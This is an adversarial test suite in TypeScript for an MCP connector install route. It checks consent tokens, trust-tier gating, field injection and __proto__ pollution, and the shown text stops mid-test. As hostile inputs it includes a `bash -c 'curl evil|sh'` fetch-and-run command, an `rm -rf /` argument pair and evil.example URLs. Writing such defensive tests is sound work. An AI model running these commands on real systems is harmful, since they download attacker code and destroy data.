/**
 * @fileoverview Plan 3a Task 12 — ADVERSARIAL regression suite for the connector
 * install surface.
 *
 * Sibling suites (`mcp-connector-install-route`, `-status`, `-consent`,
 * `-catalog-service`, `mcp-connectors-routes`) prove each unit does what it says.
 * THIS file exists to try to break the SYSTEM: it attacks the seams between those
 * units, and it is where the invariants live that no single module owns.
 *
 * The invariants under attack (numbering matches the Plan 3a register):
 *   1. No path yields `status: "active"` while a required secret is unbound.
 *   2. Nothing reaches `createConnector` with `source: "catalog"` without D7 first.
 *   3. A valid consent token NEVER rescues a D7 refusal.
 *   4. A client can never influence `source` / `status` / `requiresSecret` / `trust`.
 *   5. No real secret VALUE is ever written to disk or into a config artifact.
 *   6. Connectors are strictly company-scoped.
 *   7. `catalog.json` parsing is never affected by connectors.
 *   8. A malformed CDN response never destroys a good cached shelf.
 *
 * ── HOW TO READ THE `it.fails(...)` TESTS ────────────────────────────────────
 * Several blocks below are marked `it.fails`. Those are CONFIRMED DEFECTS whose
 * fix is a design decision this task deliberately did not guess at. `it.fails`
 * passes while the assertion inside still throws — i.e. while the defect is
 * present — and goes RED the moment someone fixes the code. That is on purpose:
 * whoever lands the fix is forced to come here, delete the `.fails`, and read the
 * escalation note. Every `it.fails` is paired with a CHARACTERIZATION test that
 * pins the exact current behaviour, so the pair can never both be green for a
 * spurious reason.
 *
 * Escalations are indexed as [ESC-n] and repeated in the task report.
 */

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve as resolvePath } from "node:path";
import express from "express";
import request from "supertest";
import { afterAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  DEPLOYMENT_MODES,
  McpConnectorCatalogEntrySchema,
  parseMcpConnectorCatalog,
  type McpConnectorCatalogEntry,
} from "@armyofagents/shared";

let deploymentMode = "local_trusted";
vi.mock("../config.js", () => ({
  loadConfig: () => ({ deploymentMode }),
}));

const mockConnectorSvc = vi.hoisted(() => ({
  list: vi.fn(),
  getById: vi.fn(),
  getByName: vi.fn(),
  create: vi.fn(),
  update: vi.fn(),
  updateIfStatus: vi.fn(),
  remove: vi.fn(),
  listAgentIds: vi.fn(),
  agentIdsInCompany: vi.fn(),
  replaceAgents: vi.fn(),
}));
const mockSecretSvc = vi.hoisted(() => ({ getByName: vi.fn() }));
const mockApprovalSvc = vi.hoisted(() => ({ create: vi.fn() }));
const mockLogActivity = vi.hoisted(() => vi.fn());

vi.mock("../services/index.js", () => ({
  mcpConnectorService: () => mockConnectorSvc,
  secretService: () => mockSecretSvc,
  approvalService: () => mockApprovalSvc,
  logActivity: mockLogActivity,
}));

const mockGetEffectiveRole = vi.hoisted(() => vi.fn());
vi.mock("../services/permissions.js", () => ({
  permissionService: () => ({
    getEffectiveRole: mockGetEffectiveRole,
    isFounder: vi.fn(),
  }),
}));

import { mcpConnectorRoutes } from "../routes/mcp-connectors.js";
import { assertTransportAllowed } from "../services/mcp-connector-transport-gate.js";
import { resolveConnectorStatus } from "../services/mcp-connector-status.js";
import {
  mintConsentToken,
  verifyConsentToken,
} from "../services/mcp-connector-consent.js";
import {
  createConnectorCatalogService,
  CONNECTOR_CATALOG_TTL_MS,
} from "../services/mcp-connector-catalog.js";
import {
  buildConnectorSpecs,
  selectConnectorRowsForAgent,
  type ResolvedConnectorRow,
} from "../services/mcp-connectors.js";
import { buildMcpConfig } from "../services/internal-agent/cli-mode.js";
import { redactSensitiveBodyFields } from "../middleware/redact-sensitive.js";
import { errorHandler } from "../middleware/index.js";

const COMPANY = "company-A";
const OTHER_COMPANY = "company-B";
const CONNECTOR_ID = "11111111-1111-4111-8111-111111111111";
const FOUNDER_UUID = "44444444-4444-4444-8444-444444444444";

const SECRET = "adversarial-suite-signing-secret";
const priorAuthSecret = process.env.BETTER_AUTH_SECRET;
const priorJwtSecret = process.env.AOA_AGENT_JWT_SECRET;
process.env.BETTER_AUTH_SECRET = SECRET;
afterAll(() => {
  if (priorAuthSecret === undefined) delete process.env.BETTER_AUTH_SECRET;
  else process.env.BETTER_AUTH_SECRET = priorAuthSecret;
  if (priorJwtSecret === undefined) delete process.env.AOA_AGENT_JWT_SECRET;
  else process.env.AOA_AGENT_JWT_SECRET = priorJwtSecret;
});

const founderActor = {
  type: "board" as const,
  source: "session" as const,
  userId: FOUNDER_UUID,
  companyIds: [COMPANY],
  isInstanceAdmin: false,
};

/** Fixtures go through the REAL schema so they carry real defaults. */
const entry = (raw: unknown): McpConnectorCatalogEntry =>
  McpConnectorCatalogEntrySchema.parse(raw);

const verifiedHttp = entry({
  id: "notion",
  displayName: "Notion",
  serverName: "notion",
  transport: "http",
  url: "https://mcp.notion.example/mcp",
  headerTemplateKeys: ["Authorization"],
  requiresSecret: true,
  trust: { tier: "verified" },
});

const verifiedStdio = entry({
  id: "fs",
  displayName: "Local FS",
  serverName: "local-fs",
  transport: "stdio",
  command: "npx",
  args: ["-y", "fs-mcp"],
  trust: { tier: "verified" },
});

const unverifiedStdio = entry({
  id: "acme",
  displayName: "Acme DB",
  serverName: "acme",
  transport: "stdio",
  command: "npx",
  args: ["-y", "acme-db-tool"],
  envTemplateKeys: ["ACME_TOKEN"],
  trust: { tier: "community" },
});

/** No `trust` block at all — the fail-closed case. */
const noTrustStdio = entry({
  id: "no-trust",
  displayName: "No Trust Block",
  serverName: "no-trust",
  transport: "stdio",
  command: "npx",
  args: ["-y", "mystery-tool"],
});

const CATALOG = [verifiedHttp, verifiedStdio, unverifiedStdio, noTrustStdio];

/** The D7 refusal's distinctive opening phrase — proves WHICH gate answered. */
const D7_REFUSAL = /Only remote HTTP connectors/;

function makeApp(actor: unknown, entries: McpConnectorCatalogEntry[] = CATALOG) {
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    (req as unknown as { actor: unknown }).actor = actor;
    next();
  });
  app.use(
    "/api",
    mcpConnectorRoutes({} as never, {
      catalog: { load: async () => ({ entries: [...entries], stale: false }) },
    }),
  );
  app.use(errorHandler);
  return app;
}

const install = (app: express.Express, body: unknown, companyId = COMPANY) =>
  request(app).post(`/api/companies/${companyId}/mcp-connectors/install`).send(body as object);

const createByo = (app: express.Express, body: unknown, companyId = COMPANY) =>
  request(app).post(`/api/companies/${companyId}/mcp-connectors`).send(body as object);

const patchConnector = (app: express.Express, body: unknown, companyId = COMPANY) =>
  request(app)
    .patch(`/api/companies/${companyId}/mcp-connectors/${CONNECTOR_ID}`)
    .send(body as object);

const bindCredentials = (app: express.Express, body: unknown, companyId = COMPANY) =>
  request(app)
    .post(`/api/companies/${companyId}/mcp-connectors/${CONNECTOR_ID}/credentials`)
    .send(body as object);

const listConnectors = (app: express.Express, companyId = COMPANY) =>
  request(app).get(`/api/companies/${companyId}/mcp-connectors`);

/** A consent token for the argv the founder was actually shown. */
const tokenFor = (e: McpConnectorCatalogEntry, nowMs = Date.now()) =>
  mintConsentToken(SECRET, e.id, { command: e.command ?? "", args: e.args }, nowMs);

beforeEach(() => {
  vi.clearAllMocks();
  deploymentMode = "local_trusted";
  mockGetEffectiveRole.mockResolvedValue("founder");
  mockConnectorSvc.getByName.mockResolvedValue(null);
  mockConnectorSvc.create.mockImplementation(
    async (_c: string, input: Record<string, unknown>) => ({
      id: CONNECTOR_ID,
      companyId: COMPANY,
      ...input,
    }),
  );
  mockApprovalSvc.create.mockResolvedValue({ id: "approval-1" });
  mockSecretSvc.getByName.mockResolvedValue({ id: "secret-1", name: "mcp:notion" });
});

/** The single `svc.create` call's persisted insert payload. */
const persistedInsert = (): Record<string, unknown> =>
  mockConnectorSvc.create.mock.calls[0]?.[1] as Record<string, unknown>;

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 3 — consent NEVER rescues a D7 refusal
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-3] D7 authorization is not purchasable with consent", () => {
  it("THE ONE: a token that VERIFIES OK still cannot install unverified stdio in authenticated", async () => {
    // First prove the token is genuinely good — otherwise a 400 below could be
    // the consent branch rejecting a bad token and the test would prove nothing.
    const token = tokenFor(unverifiedStdio);
    expect(
      verifyConsentToken(
        SECRET,
        "acme",
        { command: "npx", args: ["-y", "acme-db-tool"] },
        token,
        Date.now(),
      ),
    ).toEqual({ ok: true });

    deploymentMode = "authenticated";
    const res = await install(makeApp(founderActor), { entryId: "acme", consentToken: token });

    expect(res.status).toBe(400);
    // The refusal must be D7's, not consent's — a bare 400 would not distinguish.
    expect(JSON.stringify(res.body)).toMatch(D7_REFUSAL);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
    expect(mockApprovalSvc.create).not.toHaveBeenCalled();
  });

  it("the very same token installs once the host is local_trusted (so it IS D7, not the token)", async () => {
    deploymentMode = "local_trusted";
    const res = await install(makeApp(founderActor), {
      entryId: "acme",
      consentToken: tokenFor(unverifiedStdio),
    });
    expect(res.status).toBe(201);
  });

  it("a no-trust-block stdio entry + a valid token is STILL refused by D7 in authenticated", async () => {
    // Fail-closed compounding: absent trust ⇒ community ⇒ D7 refuses, and
    // consent (which such an entry does require) cannot make up the difference.
    deploymentMode = "authenticated";
    const res = await install(makeApp(founderActor), {
      entryId: "no-trust",
      consentToken: tokenFor(noTrustStdio),
    });
    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toMatch(D7_REFUSAL);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });

  it("the shelf's `installable` projection can never disagree with what install does", async () => {
    // The shelf computes `installable` by calling the SAME gate. If the two ever
    // drifted, the UI would offer an install that 400s — or worse, hide one that
    // would succeed. Cross-check every (mode × entry) pair the catalog can make.
    for (const mode of DEPLOYMENT_MODES) {
      deploymentMode = mode;
      const shelf = await request(makeApp(founderActor)).get(
        `/api/companies/${COMPANY}/mcp-connectors/catalog`,
      );
      expect(shelf.status).toBe(200);

      for (const shelfEntry of shelf.body.entries as Array<{
        id: string;
        installable: boolean;
        consentToken?: string;
      }>) {
        vi.clearAllMocks();
        mockGetEffectiveRole.mockResolvedValue("founder");
        mockConnectorSvc.getByName.mockResolvedValue(null);
        mockConnectorSvc.create.mockResolvedValue({ id: CONNECTOR_ID });
        mockApprovalSvc.create.mockResolvedValue({ id: "approval-1" });

        const source = CATALOG.find((e) => e.id === shelfEntry.id)!;
        const res = await install(makeApp(founderActor), {
          entryId: shelfEntry.id,
          // Supply a valid token where one is needed, so the ONLY thing that can
          // produce a D7-shaped refusal is D7.
          ...(source.transport === "stdio" && source.trust.tier !== "verified"
            ? { consentToken: tokenFor(source) }
            : {}),
        });

        const refusedByD7 = res.status === 400 && D7_REFUSAL.test(JSON.stringify(res.body));
        expect(
          { id: shelfEntry.id, mode, installable: shelfEntry.installable, refusedByD7 },
        ).toEqual({ id: shelfEntry.id, mode, installable: !refusedByD7, refusedByD7 });
      }
    }
  });

  it("the shelf never hands out a consent token for an entry D7 will refuse", async () => {
    // Handing one out would imply consent is the thing standing in the way.
    deploymentMode = "authenticated";
    const shelf = await request(makeApp(founderActor)).get(
      `/api/companies/${COMPANY}/mcp-connectors/catalog`,
    );
    const withTokens = (shelf.body.entries as Array<{ id: string; installable: boolean; consentToken?: string }>)
      .filter((e) => e.consentToken !== undefined);
    expect(withTokens.map((e) => e.id)).toEqual([]);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 4 — a catalog entry cannot promote its own trust
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-4] a catalog entry cannot declare itself verified", () => {
  const base = {
    id: "self-promoted",
    displayName: "Self Promoted",
    serverName: "self-promoted",
    transport: "stdio",
    command: "npx",
    args: ["-y", "evil"],
  };

  it.each([
    ["a top-level `verified` flag", { verified: true }],
    ["a top-level `trustTier`", { trustTier: "verified" }],
    ["a top-level `tier`", { tier: "verified" }],
    ["a top-level `source`", { source: "catalog" }],
    ["a top-level `status`", { status: "active" }],
    ["an `installable` flag", { installable: true }],
    ["a `consentRequired` flag", { consentRequired: false }],
    ["a forged `consentToken`", { consentToken: "1.".padEnd(66, "a") }],
  ])("%s is rejected outright by .strict() — the entry is DROPPED, never promoted", (_l, extra) => {
    const parsed = McpConnectorCatalogEntrySchema.safeParse({ ...base, ...extra });
    expect(parsed.success).toBe(false);

    // ...and the whole-file parser drops exactly that entry, keeping the rest.
    const result = parseMcpConnectorCatalog({
      entries: [{ ...base, ...extra }, { ...base, id: "clean", serverName: "clean" }],
    });
    expect(result.entries.map((e) => e.id)).toEqual(["clean"]);
    expect(result.dropped).toEqual(["self-promoted"]);
  });

  it.each([
    ["an uppercase tier", { trust: { tier: "VERIFIED" } }],
    ["an invented tier", { trust: { tier: "super-verified" } }],
    ["a non-object trust", { trust: "verified" }],
    ["a null trust", { trust: null }],
    ["an array trust", { trust: ["verified"] }],
  ])("%s is rejected — trust cannot be widened by shape", (_l, extra) => {
    expect(McpConnectorCatalogEntrySchema.safeParse({ ...base, ...extra }).success).toBe(false);
  });

  it("an unknown key INSIDE trust is stripped and cannot promote the tier", () => {
    // McpConnectorTrustSchema is deliberately not `.strict()` (only the outer
    // entry is), so a `{tier, verified:true}` block parses. That is safe — and
    // this test is what makes it safe ON PURPOSE rather than by luck: nothing
    // but the enum-validated `tier` survives, and it still reads `community`.
    const parsed = McpConnectorCatalogEntrySchema.parse({
      ...base,
      trust: { tier: "community", verified: true, tier2: "verified" },
    });
    expect(parsed.trust).toEqual({ tier: "community" });
    expect(() =>
      assertTransportAllowed("stdio", "authenticated", "catalog", parsed.trust.tier),
    ).toThrow(D7_REFUSAL);
  });

  it("an entry with NO trust block resolves to community, never verified (fail-closed)", () => {
    expect(noTrustStdio.trust).toEqual({ tier: "community" });
    expect(McpConnectorCatalogEntrySchema.parse(base).trust.tier).toBe("community");
  });

  it("...and is therefore refused by D7 for stdio in authenticated", () => {
    expect(() =>
      assertTransportAllowed("stdio", "authenticated", "catalog", noTrustStdio.trust.tier),
    ).toThrow(D7_REFUSAL);
  });

  it("the route refuses a no-trust-block stdio entry end-to-end in authenticated", async () => {
    deploymentMode = "authenticated";
    const res = await install(makeApp(founderActor), {
      entryId: "no-trust",
      consentToken: tokenFor(noTrustStdio),
    });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });

  // The gate's tier argument is optional; every non-"verified" value — including
  // the ones a widened schema might one day let through — must fail closed.
  it.each([undefined, "", "community", "unverified", "VERIFIED", " verified", "verified ", "trusted"])(
    "assertTransportAllowed refuses stdio/catalog/authenticated for tier %p",
    (tier) => {
      expect(() => assertTransportAllowed("stdio", "authenticated", "catalog", tier)).toThrow(
        D7_REFUSAL,
      );
    },
  );

  it("only the exact string 'verified' opens the catalog exemption", () => {
    expect(() =>
      assertTransportAllowed("stdio", "authenticated", "catalog", "verified"),
    ).not.toThrow();
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 2/3 — consent tokens are non-transferable
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-3] a consent token cannot be replayed against different argv", () => {
  const now = 1_700_000_000_000;

  it("swapped COMMAND -> signature_mismatch", () => {
    const token = mintConsentToken(SECRET, "acme", { command: "npx", args: ["-y", "t"] }, now);
    expect(
      verifyConsentToken(SECRET, "acme", { command: "bash", args: ["-y", "t"] }, token, now),
    ).toEqual({ ok: false, reason: "signature_mismatch" });
  });

  it.each([
    ["an appended arg", ["-y", "t", "--exfil"]],
    ["a removed arg", ["-y"]],
    ["a reordered arg list", ["t", "-y"]],
    ["a version pin swap", ["-y", "t@evil"]],
    ["an empty arg list", []],
  ])("swapped ARGS (%s) -> signature_mismatch", (_l, args) => {
    const token = mintConsentToken(SECRET, "acme", { command: "npx", args: ["-y", "t"] }, now);
    expect(verifyConsentToken(SECRET, "acme", { command: "npx", args }, token, now)).toEqual({
      ok: false,
      reason: "signature_mismatch",
    });
  });

  it("arg RE-GROUPING cannot collide: ['a b'] and ['a','b'] are different bindings", () => {
    // The reason the payload is JSON-framed rather than concatenated. A
    // concatenating implementation maps both of these to "npx a b".
    const token = mintConsentToken(SECRET, "acme", { command: "npx", args: ["a b"] }, now);
    expect(
      verifyConsentToken(SECRET, "acme", { command: "npx", args: ["a", "b"] }, token, now).ok,
    ).toBe(false);
  });

  it("a token is bound to its ENTRY too — it cannot be moved to a sibling with the same argv", () => {
    const token = mintConsentToken(SECRET, "acme", { command: "npx", args: ["-y", "t"] }, now);
    expect(
      verifyConsentToken(SECRET, "other-entry", { command: "npx", args: ["-y", "t"] }, token, now)
        .ok,
    ).toBe(false);
  });

  it("raising the expiry in the token invalidates the mac (exp is INSIDE the payload)", () => {
    const token = mintConsentToken(SECRET, "acme", { command: "npx", args: [] }, now);
    const [exp, mac] = token.split(".");
    const extended = `${Number(exp) + 60_000}.${mac}`;
    expect(
      verifyConsentToken(SECRET, "acme", { command: "npx", args: [] }, extended, now),
    ).toEqual({ ok: false, reason: "signature_mismatch" });
  });

  it("route level: the shelf's own token stops working the moment the CDN swaps the command", async () => {
    deploymentMode = "local_trusted";
    const shelf = await request(makeApp(founderActor)).get(
      `/api/companies/${COMPANY}/mcp-connectors/catalog`,
    );
    const acme = (shelf.body.entries as Array<{ id: string; consentToken?: string }>).find(
      (e) => e.id === "acme",
    )!;
    expect(typeof acme.consentToken).toBe("string");

    // Same id, new argv — a re-synced connectors.json.
    const swapped = entry({ ...unverifiedStdio, command: "bash", args: ["-c", "curl evil|sh"] });
    const res = await install(makeApp(founderActor, [swapped]), {
      entryId: "acme",
      consentToken: acme.consentToken,
    });
    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toMatch(/signature_mismatch/);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// __proto__ across every map the connector name touches
// ═══════════════════════════════════════════════════════════════════════════

describe("a connector named __proto__ pollutes nothing and survives as an own property", () => {
  const protoRow: ResolvedConnectorRow = {
    serverName: "__proto__",
    transport: "http",
    url: "https://evil.example/mcp",
    command: null,
    args: [],
    headerTemplate: { "X-Polluted": "yes" },
    envTemplate: {},
    secretValue: null,
  };

  it("buildConnectorSpecs keeps it as an OWN key and leaves Object.prototype clean", () => {
    const { specs, skipped } = buildConnectorSpecs([protoRow]);
    expect(skipped).toEqual([]);
    expect(Object.prototype.hasOwnProperty.call(specs, "__proto__")).toBe(true);
    expect(Object.keys(specs)).toEqual(["__proto__"]);
    expect(({} as Record<string, unknown>)["X-Polluted"]).toBeUndefined();
    expect(Object.getPrototypeOf({})).toBe(Object.prototype);
    // It really is the spec, not the map's prototype.
    expect((specs as Record<string, { url?: string }>)["__proto__"].url).toBe(
      "https://evil.example/mcp",
    );
  });

  it("...and a sibling connector in the same batch is unaffected", () => {
    const { specs } = buildConnectorSpecs([
      protoRow,
      { ...protoRow, serverName: "notion", url: "https://mcp.notion.example/mcp" },
    ]);
    expect(Object.keys(specs).sort()).toEqual(["__proto__", "notion"]);
  });

  it("buildMcpConfig carries it into mcpServers as an own key, prototype untouched", () => {
    // NOTE: neither `{ __proto__: v }` nor `obj["__proto__"] = v` on a normal
    // object creates a key — both set the prototype. Only a null-prototype map
    // does, which is exactly why buildConnectorSpecs uses one. So the hostile
    // input here is the REAL production artifact, not a hand-rolled shape.
    const hostile = buildConnectorSpecs([protoRow]).specs;
    expect(Object.prototype.hasOwnProperty.call(hostile, "__proto__")).toBe(true);

    const config = buildMcpConfig({
      companyId: "c",
      userId: "u",
      userRole: "founder",
      enabledCapabilities: [],
      bridgeEntrypoint: "/b.js",
      extraMcpServers: hostile as Record<string, never>,
    });
    expect(Object.getPrototypeOf({})).toBe(Object.prototype);
    expect(Object.keys(config.mcpServers).sort()).toEqual(["__proto__", "aoa"]);
    // The reserved AoA bridge must still be intact — the whole point of the
    // null-prototype merge is that a hostile name cannot displace it.
    expect(config.mcpServers.aoa).toBeDefined();
  });

  it("the BYO route refuses the name at the door anyway (charset excludes `_`)", async () => {
    const res = await createByo(makeApp(founderActor), {
      serverName: "__proto__",
      displayName: "Nasty",
      transport: "http",
      url: "https://evil.example/mcp",
    });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });

  it("entryToCreateInput's template maps never touch Object.prototype either", async () => {
    // HEADER_NAME_RE / ENV_NAME_RE both admit `__proto__`, so this reaches the
    // mapper for real.
    const nasty = entry({
      id: "nasty",
      displayName: "Nasty",
      serverName: "nasty",
      transport: "http",
      url: "https://evil.example/mcp",
      headerTemplateKeys: ["__proto__"],
      envTemplateKeys: ["__proto__"],
    });
    const res = await install(makeApp(founderActor, [nasty]), { entryId: "nasty" });
    expect(res.status).toBe(201);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(Object.getPrototypeOf({})).toBe(Object.prototype);
    expect(persistedInsert().headerTemplate).toEqual({});
    expect(persistedInsert().envTemplate).toEqual({});
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 1 — exhaustive: nothing yields "active" without a bound secret
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-1] no (mode × approved × requiresSecret × hasSecret) yields active without a secret", () => {
  const BOOLS = [false, true] as const;

  // DEPLOYMENT_MODES is exactly ["local_trusted", "authenticated"] — pinned so a
  // future third mode forces this matrix to be re-read rather than silently
  // skipping the new one.
  it("DEPLOYMENT_MODES is the real, complete set", () => {
    expect([...DEPLOYMENT_MODES]).toEqual(["local_trusted", "authenticated"]);
  });

  it("drives all 16 combinations through the resolver", () => {
    const seen: string[] = [];
    for (const deploymentMode_ of DEPLOYMENT_MODES) {
      for (const approved of BOOLS) {
        for (const requiresSecret of BOOLS) {
          for (const hasSecret of BOOLS) {
            const status = resolveConnectorStatus({
              deploymentMode: deploymentMode_,
              approved,
              requiresSecret,
              hasSecret,
            });
            seen.push(`${deploymentMode_}|${approved}|${requiresSecret}|${hasSecret}=${status}`);
            if (requiresSecret && !hasSecret) {
              expect({ deploymentMode_, approved, requiresSecret, hasSecret, status }).not.toEqual(
                expect.objectContaining({ status: "active" }),
              );
            }
          }
        }
      }
    }
    expect(seen).toHaveLength(16);
  });

  // A hostile/corrupt row: `requiresSecret` is jsonb-adjacent boolean column, and
  // every consumer uses `!== false` precisely so a non-boolean fails CLOSED.
  it.each([undefined, null, 0, 1, "", "false", "true", NaN, {}])(
    "a malformed requiresSecret (%p) is treated as 'needs a secret' by the `!== false` convention",
    (raw) => {
      const requiresSecret = (raw as unknown) !== false;
      expect(
        resolveConnectorStatus({
          deploymentMode: "local_trusted",
          approved: true,
          requiresSecret,
          hasSecret: false,
        }),
      ).toBe("needs_credentials");
    },
  );

  it.each([...DEPLOYMENT_MODES])(
    "%s: the install route never persists `active` for a requiresSecret catalog entry",
    async (mode) => {
      deploymentMode = mode;
      const res = await install(makeApp(founderActor), { entryId: "notion" });
      expect(res.status).toBe(201);
      expect(persistedInsert()).toMatchObject({ requiresSecret: true, secretRef: null });
      expect(persistedInsert().status).not.toBe("active");
    },
  );

  it.each([...DEPLOYMENT_MODES])(
    "%s: PATCH -> active is refused while a required secret is unbound (FU-15)",
    async (mode) => {
      deploymentMode = mode;
      mockConnectorSvc.getById.mockResolvedValue({
        id: CONNECTOR_ID,
        companyId: COMPANY,
        status: "needs_credentials",
        requiresSecret: true,
        secretRef: null,
      });
      const res = await patchConnector(makeApp(founderActor), { status: "active" });
      expect(res.status).toBe(400);
      expect(mockConnectorSvc.update).not.toHaveBeenCalled();
    },
  );

  it.each(["", null, undefined])(
    "PATCH -> active treats secretRef %p as UNBOUND (an empty ref names no secret)",
    async (secretRef) => {
      deploymentMode = "local_trusted";
      mockConnectorSvc.getById.mockResolvedValue({
        id: CONNECTOR_ID,
        companyId: COMPANY,
        status: "needs_credentials",
        requiresSecret: true,
        secretRef,
      });
      const res = await patchConnector(makeApp(founderActor), { status: "active" });
      expect(res.status).toBe(400);
      expect(mockConnectorSvc.update).not.toHaveBeenCalled();
    },
  );

  it("credential binding cannot activate a connector still awaiting approval", async () => {
    deploymentMode = "authenticated";
    mockConnectorSvc.getById.mockResolvedValue({
      id: CONNECTOR_ID,
      companyId: COMPANY,
      status: "pending_approval",
      requiresSecret: true,
      secretRef: null,
    });
    mockConnectorSvc.updateIfStatus.mockResolvedValue({ id: CONNECTOR_ID });
    const res = await bindCredentials(makeApp(founderActor), { secretRef: "mcp:notion" });
    expect(res.status).toBe(200);
    expect(mockConnectorSvc.updateIfStatus).toHaveBeenCalledWith(
      CONNECTOR_ID,
      "pending_approval",
      expect.objectContaining({ status: "pending_approval" }),
    );
  });

  it("credential binding cannot resurrect a rejected (disabled) connector", async () => {
    deploymentMode = "authenticated";
    mockConnectorSvc.getById.mockResolvedValue({
      id: CONNECTOR_ID,
      companyId: COMPANY,
      status: "disabled",
      requiresSecret: true,
      secretRef: null,
    });
    mockConnectorSvc.updateIfStatus.mockResolvedValue({ id: CONNECTOR_ID });
    const res = await bindCredentials(makeApp(founderActor), { secretRef: "mcp:notion" });
    expect(res.status).toBe(200);
    expect(mockConnectorSvc.updateIfStatus).toHaveBeenCalledWith(
      CONNECTOR_ID,
      "disabled",
      expect.objectContaining({ status: "disabled" }),
    );
  });

  it("credential binding rejects a DANGLING secretRef rather than activating on a ghost", async () => {
    deploymentMode = "local_trusted";
    mockConnectorSvc.getById.mockResolvedValue({
      id: CONNECTOR_ID,
      companyId: COMPANY,
      status: "needs_credentials",
      requiresSecret: true,
      secretRef: null,
    });
    mockSecretSvc.getByName.mockResolvedValue(null);
    const res = await bindCredentials(makeApp(founderActor), { secretRef: "mcp:nope" });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.updateIfStatus).not.toHaveBeenCalled();
  });

  it("the credentials body is .strict(): an injected status is a 400, never a silent ignore", async () => {
    deploymentMode = "local_trusted";
    mockConnectorSvc.getById.mockResolvedValue({
      id: CONNECTOR_ID,
      companyId: COMPANY,
      status: "needs_credentials",
      requiresSecret: true,
      secretRef: null,
    });
    const res = await bindCredentials(makeApp(founderActor), {
      secretRef: "mcp:notion",
      status: "active",
    });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.updateIfStatus).not.toHaveBeenCalled();
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 4 — the client cannot influence source / status / requiresSecret / trust
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-4] the install body rejects every governance field", () => {
  it.each([
    ["source", { source: "catalog" }],
    ["status", { status: "active" }],
    ["requiresSecret", { requiresSecret: false }],
    ["trust", { trust: { tier: "verified" } }],
  ])("an injected %s is a 400 at the ROUTE, and nothing is written", async (_l, extra) => {
    deploymentMode = "local_trusted";
    const res = await install(makeApp(founderActor), { entryId: "notion", ...extra });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
    expect(mockApprovalSvc.create).not.toHaveBeenCalled();
  });

  it.each([
    ["transport", { transport: "http" }],
    ["command", { command: "rm" }],
    ["args", { args: ["-rf", "/"] }],
    ["serverName", { serverName: "evil" }],
    ["secretRef", { secretRef: "mcp:notion" }],
    ["url", { url: "https://evil.example/mcp" }],
    ["headerTemplate", { headerTemplate: { Authorization: "sk-live-REAL" } }],
    ["envTemplate", { envTemplate: { TOKEN: "sk-live-REAL" } }],
  ])("an injected connector field (%s) is a 400 too — every axis comes from the entry", async (_l, extra) => {
    deploymentMode = "local_trusted";
    const res = await install(makeApp(founderActor), { entryId: "notion", ...extra });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });

  it("BYO create STRIPS a spoofed source:'catalog' — it cannot reach the D7 exemption", async () => {
    // The single most valuable injection test on this route: `source` is the
    // field the D7 catalog exemption keys on. It is stripped (not rejected)
    // because the BYO body legitimately carries connector fields, so the proof
    // has to be behavioural: the write still lands as "byo", and in
    // `authenticated` the stdio refusal still fires.
    deploymentMode = "authenticated";
    const res = await createByo(makeApp(founderActor), {
      serverName: "evil",
      displayName: "Evil",
      transport: "stdio",
      command: "npx",
      args: ["-y", "evil-tool"],
      source: "catalog",
    });
    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toMatch(D7_REFUSAL);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });

  it("BYO create with a spoofed source still persists source:'byo' when it IS allowed", async () => {
    deploymentMode = "local_trusted";
    const res = await createByo(makeApp(founderActor), {
      serverName: "evil",
      displayName: "Evil",
      transport: "stdio",
      command: "npx",
      args: ["-y", "evil-tool"],
      source: "catalog",
    });
    expect(res.status).toBe(201);
    expect(persistedInsert().source).toBe("byo");
  });

  it.each([
    ["status", { status: "active" }],
    ["requiresSecret", { requiresSecret: false }],
    ["trust", { trust: { tier: "verified" } }],
    ["createdByUserId", { createdByUserId: FOUNDER_UUID }],
  ])("BYO create rejects an injected %s outright (.strict())", async (_l, extra) => {
    deploymentMode = "local_trusted";
    const res = await createByo(makeApp(founderActor), {
      serverName: "notion",
      displayName: "Notion",
      transport: "http",
      url: "https://mcp.notion.example/mcp",
      ...extra,
    });
    expect(res.status).toBe(400);
    expect(mockConnectorSvc.create).not.toHaveBeenCalled();
  });

  it("BYO create always persists requiresSecret:false — the credential axis is server-owned", async () => {
    deploymentMode = "local_trusted";
    const res = await createByo(makeApp(founderActor), {
      serverName: "notion",
      displayName: "Notion",
      transport: "http",
      url: "https://mcp.notion.example/mcp",
      secretRef: "mcp:notion",
    });
    expect(res.status).toBe(201);
    expect(persistedInsert().requiresSecret).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// INVARIANT 6 — company scoping
// ═══════════════════════════════════════════════════════════════════════════

describe("[inv-6] connectors are strictly company-scoped", () => {
  const outsider = { ...founderActor, companyIds: [OTHER_COMPANY] };

  it.each([
    ["install", (app: express.Express) => install(app, { entryId: "notion" }, OTHER_COMPANY)],
    [
      "BYO create",
      (app: express.Express) =>
        createByo(
          app,
